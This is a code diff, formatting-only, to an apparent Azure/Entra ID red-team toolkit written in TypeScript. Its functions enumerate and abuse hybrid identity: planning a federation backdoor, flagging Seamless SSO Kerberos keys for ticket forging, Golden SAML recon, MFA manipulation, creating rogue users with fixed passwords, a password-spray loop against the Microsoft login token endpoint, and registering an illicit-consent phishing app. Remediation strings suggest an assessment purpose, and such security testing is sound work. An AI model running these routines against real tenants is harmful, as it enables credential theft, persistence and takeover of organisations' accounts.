@@ -7,7 +7,11 @@ export async function federationBackdoor(args: string[], timeout: number): Promi
   const findings: Finding[] = []
   const output: string[] = ["[*] Enumerating federation configuration...\n"]
 
-  const domains = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/domains"], undefined, timeout)
+  const domains = await az(
+    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/domains"],
+    undefined,
+    timeout,
+  )
   if (domains.exitCode !== 0) return { output: `[-] Failed to enumerate domains: ${domains.stderr.trim()}`, findings }
   const domainList = tryJson(domains.stdout)?.value || []
   const federated = domainList.filter((d: Record<string, unknown>) => d.authenticationType === "Federated")
@@ -29,8 +33,12 @@ export async function federationBackdoor(args: string[], timeout: number): Promi
 
   if (domain && idpUrl) {
     output.push(`\n[*] Would add federation trust for ${domain} → ${idpUrl}`)
-    output.push(`[*] Command: az rest --method POST --url "https://graph.microsoft.com/v1.0/domains/${domain}/federationConfiguration"`)
-    output.push(`[*] Body: {"issuerUri":"${idpUrl}","passiveSignInUri":"${idpUrl}/saml2","preferredAuthenticationProtocol":"saml"}`)
+    output.push(
+      `[*] Command: az rest --method POST --url "https://graph.microsoft.com/v1.0/domains/${domain}/federationConfiguration"`,
+    )
+    output.push(
+      `[*] Body: {"issuerUri":"${idpUrl}","passiveSignInUri":"${idpUrl}/saml2","preferredAuthenticationProtocol":"saml"}`,
+    )
     findings.push({
       checkId: "AZ-FED-002",
       provider: "azure",
@@ -55,7 +63,17 @@ export async function ptaAbuse(args: string[], timeout: number): Promise<HookRes
   const findings: Finding[] = []
   const output: string[] = ["[*] Enumerating Pass-Through Authentication agents...\n"]
 
-  const agents = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/onPremisesPublishingProfiles/provisioning/agents"], undefined, timeout)
+  const agents = await az(
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      "https://graph.microsoft.com/v1.0/onPremisesPublishingProfiles/provisioning/agents",
+    ],
+    undefined,
+    timeout,
+  )
   if (agents.exitCode === 0) {
     const items = tryJson(agents.stdout)?.value || []
     output.push(`[+] PTA agents found: ${items.length}`)
@@ -69,7 +87,8 @@ export async function ptaAbuse(args: string[], timeout: number): Promise<HookRes
           status: "FAIL",
           resource: `pta-agent://${a.machineName || a.id}`,
           title: `Active PTA agent: ${a.machineName || a.id}`,
-          details: "PTA agents intercept authentication in real-time — compromising this host enables credential interception for all cloud auth",
+          details:
+            "PTA agents intercept authentication in real-time — compromising this host enables credential interception for all cloud auth",
           remediation: "Ensure PTA agent hosts are hardened, monitored, and treated as Tier 0 assets",
         })
       }
@@ -79,7 +98,17 @@ export async function ptaAbuse(args: string[], timeout: number): Promise<HookRes
     output.push("[*] Checking organization sync status instead...")
   }
 
-  const org = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/organization?$select=onPremisesSyncEnabled,onPremisesLastSyncDateTime,verifiedDomains"], undefined, timeout)
+  const org = await az(
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      "https://graph.microsoft.com/v1.0/organization?$select=onPremisesSyncEnabled,onPremisesLastSyncDateTime,verifiedDomains",
+    ],
+    undefined,
+    timeout,
+  )
   if (org.exitCode === 0) {
     const orgs = tryJson(org.stdout)?.value || []
     for (const o of orgs) {
@@ -107,7 +136,17 @@ export async function aadconnectDump(args: string[], timeout: number): Promise<H
   const findings: Finding[] = []
   const output: string[] = ["[*] Enumerating Azure AD Connect configuration...\n"]
 
-  const org = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/organization?$select=onPremisesSyncEnabled,onPremisesLastSyncDateTime,onPremisesLastPasswordSyncDateTime"], undefined, timeout)
+  const org = await az(
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      "https://graph.microsoft.com/v1.0/organization?$select=onPremisesSyncEnabled,onPremisesLastSyncDateTime,onPremisesLastPasswordSyncDateTime",
+    ],
+    undefined,
+    timeout,
+  )
   if (org.exitCode === 0) {
     const orgs = tryJson(org.stdout)?.value || []
     for (const o of orgs) {
@@ -131,7 +170,19 @@ export async function aadconnectDump(args: string[], timeout: number): Promise<H
     }
   }
 
-  const sp = await az(["ad", "sp", "list", "--filter", "displayName eq 'Microsoft Azure AD Connect'", "--query", "[].{id:id,appId:appId,displayName:displayName}"], undefined, timeout)
+  const sp = await az(
+    [
+      "ad",
+      "sp",
+      "list",
+      "--filter",
+      "displayName eq 'Microsoft Azure AD Connect'",
+      "--query",
+      "[].{id:id,appId:appId,displayName:displayName}",
+    ],
+    undefined,
+    timeout,
+  )
   if (sp.exitCode === 0) {
     const sps = tryJson(sp.stdout) || []
     if (sps.length > 0) {
@@ -146,13 +197,26 @@ export async function aadconnectDump(args: string[], timeout: number): Promise<H
         status: "INFO",
         resource: `sp://${sps[0].appId}`,
         title: "AADConnect service principal active",
-        details: "AADConnect sync account has DCSync-equivalent permissions. Compromising the AADConnect server allows extracting all password hashes",
+        details:
+          "AADConnect sync account has DCSync-equivalent permissions. Compromising the AADConnect server allows extracting all password hashes",
         remediation: "Monitor AADConnect SP activity, restrict its permissions to minimum required",
       })
     }
   }
 
-  const syncSp = await az(["ad", "sp", "list", "--filter", "startswith(displayName, 'Sync_')", "--query", "[].{id:id,displayName:displayName,appId:appId}"], undefined, timeout)
+  const syncSp = await az(
+    [
+      "ad",
+      "sp",
+      "list",
+      "--filter",
+      "startswith(displayName, 'Sync_')",
+      "--query",
+      "[].{id:id,displayName:displayName,appId:appId}",
+    ],
+    undefined,
+    timeout,
+  )
   if (syncSp.exitCode === 0) {
     const syncs = tryJson(syncSp.stdout) || []
     if (syncs.length > 0) {
@@ -180,7 +244,11 @@ export async function seamlessSsoAbuse(args: string[], timeout: number): Promise
   const findings: Finding[] = []
   const output: string[] = ["[*] Enumerating Seamless SSO configuration...\n"]
 
-  const policy = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/policies/authenticationFlowsPolicy"], undefined, timeout)
+  const policy = await az(
+    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/policies/authenticationFlowsPolicy"],
+    undefined,
+    timeout,
+  )
   if (policy.exitCode === 0) {
     const p = tryJson(policy.stdout)
     output.push(`[+] Authentication flows policy retrieved`)
@@ -189,7 +257,17 @@ export async function seamlessSsoAbuse(args: string[], timeout: number): Promise
     }
   }
 
-  const org = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/organization?$select=onPremisesSyncEnabled,verifiedDomains"], undefined, timeout)
+  const org = await az(
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      "https://graph.microsoft.com/v1.0/organization?$select=onPremisesSyncEnabled,verifiedDomains",
+    ],
+    undefined,
+    timeout,
+  )
   if (org.exitCode === 0) {
     const orgs = tryJson(org.stdout)?.value || []
     for (const o of orgs) {
@@ -204,14 +282,19 @@ export async function seamlessSsoAbuse(args: string[], timeout: number): Promise
           status: "INFO",
           resource: "seamless-sso://AZUREADSSOACC",
           title: "Seamless SSO likely enabled (hybrid identity active)",
-          details: "The AZUREADSSOACC computer account's Kerberos decryption key enables forging authentication tickets for any Azure AD user",
+          details:
+            "The AZUREADSSOACC computer account's Kerberos decryption key enables forging authentication tickets for any Azure AD user",
           remediation: "Rotate AZUREADSSOACC Kerberos key every 30 days, monitor for anomalous ticket requests",
         })
       }
     }
   }
 
-  const azureadssoacc = await az(["ad", "sp", "list", "--filter", "displayName eq 'AZUREADSSOACC'", "--query", "[].{id:id,displayName:displayName}"], undefined, timeout)
+  const azureadssoacc = await az(
+    ["ad", "sp", "list", "--filter", "displayName eq 'AZUREADSSOACC'", "--query", "[].{id:id,displayName:displayName}"],
+    undefined,
+    timeout,
+  )
   if (azureadssoacc.exitCode === 0) {
     const accounts = tryJson(azureadssoacc.stdout) || []
     if (accounts.length > 0) {
@@ -223,7 +306,8 @@ export async function seamlessSsoAbuse(args: string[], timeout: number): Promise
         status: "FAIL",
         resource: "seamless-sso://AZUREADSSOACC",
         title: "Seamless SSO confirmed via AZUREADSSOACC SP",
-        details: "Extract the Kerberos key from on-prem AD to forge authentication tickets. Key is in the AZUREADSSOACC$ computer account",
+        details:
+          "Extract the Kerberos key from on-prem AD to forge authentication tickets. Key is in the AZUREADSSOACC$ computer account",
         remediation: "Rotate key: Update-AzureADSSOForest in PowerShell, monitor key usage",
       })
     }
@@ -237,7 +321,11 @@ export async function samlForge(args: string[], timeout: number): Promise<HookRe
   const findings: Finding[] = []
   const output: string[] = ["[*] Enumerating SAML/Federation configurations for Golden SAML assessment...\n"]
 
-  const domains = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/domains"], undefined, timeout)
+  const domains = await az(
+    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/domains"],
+    undefined,
+    timeout,
+  )
   if (domains.exitCode !== 0) return { output: `[-] Failed to enumerate domains: ${domains.stderr.trim()}`, findings }
 
   const domainList = tryJson(domains.stdout)?.value || []
@@ -254,14 +342,20 @@ export async function samlForge(args: string[], timeout: number): Promise<HookRe
 
     output.push(`\n[+] Domain: ${d.id} (isDefault: ${d.isDefault})`)
 
-    const fedConfig = await az(["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/domains/${d.id}/federationConfiguration`], undefined, timeout)
+    const fedConfig = await az(
+      ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/domains/${d.id}/federationConfiguration`],
+      undefined,
+      timeout,
+    )
     if (fedConfig.exitCode === 0) {
       const configs = tryJson(fedConfig.stdout)?.value || []
       for (const fc of configs) {
         output.push(`    IdP: ${fc.issuerUri || "unknown"}`)
         output.push(`    Sign-in URL: ${fc.passiveSignInUri || "unknown"}`)
         output.push(`    Protocol: ${fc.preferredAuthenticationProtocol || "unknown"}`)
-        output.push(`    Signing cert: ${fc.signingCertificate ? `${fc.signingCertificate.substring(0, 40)}...` : "not accessible"}`)
+        output.push(
+          `    Signing cert: ${fc.signingCertificate ? `${fc.signingCertificate.substring(0, 40)}...` : "not accessible"}`,
+        )
 
         findings.push({
           checkId: "AZ-SAML-001",
@@ -294,7 +388,11 @@ export async function mfaManipulation(args: string[], timeout: number): Promise<
   const findings: Finding[] = []
   const output: string[] = ["[*] Enumerating MFA configuration...\n"]
 
-  const methodsPolicy = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy"], undefined, timeout)
+  const methodsPolicy = await az(
+    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy"],
+    undefined,
+    timeout,
+  )
   if (methodsPolicy.exitCode === 0) {
     const policy = tryJson(methodsPolicy.stdout)
     const configs = policy?.authenticationMethodConfigurations || []
@@ -318,7 +416,17 @@ export async function mfaManipulation(args: string[], timeout: number): Promise<
   }
 
   if (targetUser) {
-    const userMethods = await az(["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/users/${targetUser}/authentication/methods`], undefined, timeout)
+    const userMethods = await az(
+      [
+        "rest",
+        "--method",
+        "GET",
+        "--url",
+        `https://graph.microsoft.com/v1.0/users/${targetUser}/authentication/methods`,
+      ],
+      undefined,
+      timeout,
+    )
     if (userMethods.exitCode === 0) {
       const methods = tryJson(userMethods.stdout)?.value || []
       output.push(`\n[+] MFA methods for ${targetUser}: ${methods.length}`)
@@ -339,7 +447,17 @@ export async function mfaManipulation(args: string[], timeout: number): Promise<
       }
     }
   } else {
-    const registration = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/reports/authenticationMethods/userRegistrationDetails?$filter=isMfaRegistered eq false&$top=50"], undefined, timeout)
+    const registration = await az(
+      [
+        "rest",
+        "--method",
+        "GET",
+        "--url",
+        "https://graph.microsoft.com/v1.0/reports/authenticationMethods/userRegistrationDetails?$filter=isMfaRegistered eq false&$top=50",
+      ],
+      undefined,
+      timeout,
+    )
     if (registration.exitCode === 0) {
       const users = tryJson(registration.stdout)?.value || []
       output.push(`\n[+] Users without MFA (first 50): ${users.length}`)
@@ -407,13 +525,23 @@ export async function userCreation(args: string[], timeout: number): Promise<Hoo
     return { output: output.join("\n"), findings }
   }
 
-  const create = await az([
-    "ad", "user", "create",
-    "--display-name", displayName,
-    "--user-principal-name", upn,
-    "--password", password,
-    "--force-change-password-next-sign-in", "false",
-  ], undefined, timeout)
+  const create = await az(
+    [
+      "ad",
+      "user",
+      "create",
+      "--display-name",
+      displayName,
+      "--user-principal-name",
+      upn,
+      "--password",
+      password,
+      "--force-change-password-next-sign-in",
+      "false",
+    ],
+    undefined,
+    timeout,
+  )
 
   if (create.exitCode === 0) {
     const user = tryJson(create.stdout)
@@ -463,12 +591,20 @@ export async function passwordSpray(args: string[], timeout: number): Promise<Ho
   } else if (userList) {
     try {
       const content = await Bun.file(userList).text()
-      users.push(...content.split("\n").map(l => l.trim()).filter(Boolean))
+      users.push(
+        ...content
+          .split("\n")
+          .map((l) => l.trim())
+          .filter(Boolean),
+      )
     } catch {
       return { output: `[-] Cannot read user list: ${userList}`, findings }
     }
   } else {
-    return { output: "[!] Required: --user USER or --username-list FILE [--password PASS] [--tenant TENANT] [--delay SECONDS]", findings }
+    return {
+      output: "[!] Required: --user USER or --username-list FILE [--password PASS] [--tenant TENANT] [--delay SECONDS]",
+      findings,
+    }
   }
 
   output.push(`[*] Target tenant: ${tenant}`)
@@ -482,11 +618,18 @@ export async function passwordSpray(args: string[], timeout: number): Promise<Ho
   const clientId = "04b07795-a71b-4346-935f-02f65e9a7b41"
 
   for (const u of users) {
-    const result = await run("curl", [
-      "-s", "-X", "POST",
-      `https://login.microsoftonline.com/${tenant}/oauth2/token`,
-      "-d", `grant_type=password&client_id=${clientId}&username=${encodeURIComponent(u)}&password=${encodeURIComponent(password)}&resource=https://graph.microsoft.com`,
-    ], timeout)
+    const result = await run(
+      "curl",
+      [
+        "-s",
+        "-X",
+        "POST",
+        `https://login.microsoftonline.com/${tenant}/oauth2/token`,
+        "-d",
+        `grant_type=password&client_id=${clientId}&username=${encodeURIComponent(u)}&password=${encodeURIComponent(password)}&resource=https://graph.microsoft.com`,
+      ],
+      timeout,
+    )
 
     const body = tryJson(result.stdout)
     if (body?.access_token) {
@@ -526,7 +669,7 @@ export async function passwordSpray(args: string[], timeout: number): Promise<Ho
     }
 
     if (users.indexOf(u) < users.length - 1 && delay > 0) {
-      await new Promise(r => setTimeout(r, delay * 1000))
+      await new Promise((r) => setTimeout(r, delay * 1000))
     }
   }
 
@@ -539,7 +682,11 @@ export async function tenantReconInsider(args: string[], timeout: number): Promi
   const findings: Finding[] = []
   const output: string[] = ["[*] Full insider Entra ID tenant reconnaissance...\n"]
 
-  const org = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/organization"], undefined, timeout)
+  const org = await az(
+    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/organization"],
+    undefined,
+    timeout,
+  )
   if (org.exitCode === 0) {
     const orgs = tryJson(org.stdout)?.value || []
     for (const o of orgs) {
@@ -549,9 +696,13 @@ export async function tenantReconInsider(args: string[], timeout: number): Promi
       output.push(`    Sync enabled: ${o.onPremisesSyncEnabled || false}`)
       output.push(`    Last sync: ${o.onPremisesLastSyncDateTime || "N/A"}`)
       output.push(`    Created: ${o.createdDateTime || "unknown"}`)
-      const domains = (o.verifiedDomains || []).map((d: Record<string, string>) => `${d.name}${d.isDefault ? " (default)" : ""}`).join(", ")
+      const domains = (o.verifiedDomains || [])
+        .map((d: Record<string, string>) => `${d.name}${d.isDefault ? " (default)" : ""}`)
+        .join(", ")
       output.push(`    Domains: ${domains}`)
-      const plans = (o.assignedPlans || []).filter((p: Record<string, string>) => p.capabilityStatus === "Enabled").map((p: Record<string, string>) => p.service)
+      const plans = (o.assignedPlans || [])
+        .filter((p: Record<string, string>) => p.capabilityStatus === "Enabled")
+        .map((p: Record<string, string>) => p.service)
       const unique = [...new Set(plans)]
       output.push(`    Licensed services: ${unique.join(", ")}`)
     }
@@ -563,7 +714,11 @@ export async function tenantReconInsider(args: string[], timeout: number): Promi
     output.push(`\n[+] Total users: ${count}`)
   }
 
-  const guests = await az(["ad", "user", "list", "--filter", "userType eq 'Guest'", "--query", "length(@)"], undefined, timeout)
+  const guests = await az(
+    ["ad", "user", "list", "--filter", "userType eq 'Guest'", "--query", "length(@)"],
+    undefined,
+    timeout,
+  )
   if (guests.exitCode === 0) {
     const count = tryJson(guests.stdout)
     output.push(`[+] Guest users: ${count}`)
@@ -581,7 +736,17 @@ export async function tenantReconInsider(args: string[], timeout: number): Promi
     }
   }
 
-  const admins = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members?$select=displayName,userPrincipalName"], undefined, timeout)
+  const admins = await az(
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members?$select=displayName,userPrincipalName",
+    ],
+    undefined,
+    timeout,
+  )
   if (admins.exitCode === 0) {
     const members = tryJson(admins.stdout)?.value || []
     output.push(`\n[+] Global Administrators: ${members.length}`)
@@ -637,12 +802,18 @@ export async function consentPhish(args: string[], timeout: number): Promise<Hoo
   const findings: Finding[] = []
   const output: string[] = ["[*] Illicit consent grant / OAuth phishing setup...\n"]
 
-  const authPolicy = await az(["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"], undefined, timeout)
+  const authPolicy = await az(
+    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"],
+    undefined,
+    timeout,
+  )
   if (authPolicy.exitCode === 0) {
     const policy = tryJson(authPolicy.stdout)
     const userConsent = policy?.defaultUserRolePermissions?.permissionGrantPoliciesAssigned || []
     output.push(`[+] User consent policies: ${JSON.stringify(userConsent)}`)
-    const allowsConsent = userConsent.some((p: string) => p.includes("user-default") || p.includes("ManagePermissionGrantsForSelf"))
+    const allowsConsent = userConsent.some(
+      (p: string) => p.includes("user-default") || p.includes("ManagePermissionGrantsForSelf"),
+    )
     if (allowsConsent) {
       output.push(`[+] Users CAN consent to apps — illicit consent grant is viable`)
       findings.push({
@@ -653,7 +824,8 @@ export async function consentPhish(args: string[], timeout: number): Promise<Hoo
         resource: "entra://consent-policy",
         title: "User consent to apps is allowed",
         details: "Users can grant OAuth permissions to third-party apps. Enables illicit consent grant phishing",
-        remediation: "Restrict user consent: Entra ID > Enterprise Apps > Consent and Permissions > Do not allow user consent",
+        remediation:
+          "Restrict user consent: Entra ID > Enterprise Apps > Consent and Permissions > Do not allow user consent",
       })
     } else {
       output.push(`[-] User consent is restricted — admin consent required`)
@@ -661,20 +833,31 @@ export async function consentPhish(args: string[], timeout: number): Promise<Hoo
   }
 
   if (execute) {
-    const create = await az([
-      "ad", "app", "create",
-      "--display-name", appName,
-      "--web-redirect-uris", redirectUri,
-      "--required-resource-accesses", JSON.stringify([{
-        resourceAppId: "00000003-0000-0000-c000-000000000000",
-        resourceAccess: [
-          { id: "e1fe6dd8-ba31-4d61-89e7-88639da4683d", type: "Scope" },
-          { id: "024d486e-b451-40bb-833d-3e66d98c5c73", type: "Scope" },
-          { id: "570282fd-fa5c-430d-a7fd-fc8dc98a9dca", type: "Scope" },
-          { id: "7427e0e9-2fba-42fe-b0c0-848c9e6a8182", type: "Scope" },
-        ]
-      }]),
-    ], undefined, timeout)
+    const create = await az(
+      [
+        "ad",
+        "app",
+        "create",
+        "--display-name",
+        appName,
+        "--web-redirect-uris",
+        redirectUri,
+        "--required-resource-accesses",
+        JSON.stringify([
+          {
+            resourceAppId: "00000003-0000-0000-c000-000000000000",
+            resourceAccess: [
+              { id: "e1fe6dd8-ba31-4d61-89e7-88639da4683d", type: "Scope" },
+              { id: "024d486e-b451-40bb-833d-3e66d98c5c73", type: "Scope" },
+              { id: "570282fd-fa5c-430d-a7fd-fc8dc98a9dca", type: "Scope" },
+              { id: "7427e0e9-2fba-42fe-b0c0-848c9e6a8182", type: "Scope" },
+            ],
+          },
+        ]),
+      ],
+      undefined,
+      timeout,
+    )
 
     if (create.exitCode === 0) {
       const app = tryJson(create.stdout)
